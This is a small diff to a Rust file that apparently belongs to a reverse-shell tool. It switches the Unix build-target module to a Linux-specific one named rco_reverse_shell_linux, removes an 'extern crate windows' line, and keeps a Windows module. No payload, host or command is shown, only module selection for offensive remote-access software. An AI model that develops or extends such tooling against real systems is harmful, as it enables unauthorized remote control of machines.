@@ -2,13 +2,11 @@
 mod config;
 
 // Load the appropriate operating system's implementation
-#[cfg(unix)]
-mod rco_reverse_shell_unix;
-#[cfg(unix)]
-use rco_reverse_shell_unix::shell;
+#[cfg(target_os = "linux")]
+mod rco_reverse_shell_linux;
+#[cfg(target_os = "linux")]
+use rco_reverse_shell_linux::shell;
 
-#[cfg(windows)]
-extern crate windows;
 #[cfg(windows)]
 mod rco_reverse_shell_windows;
 #[cfg(windows)]
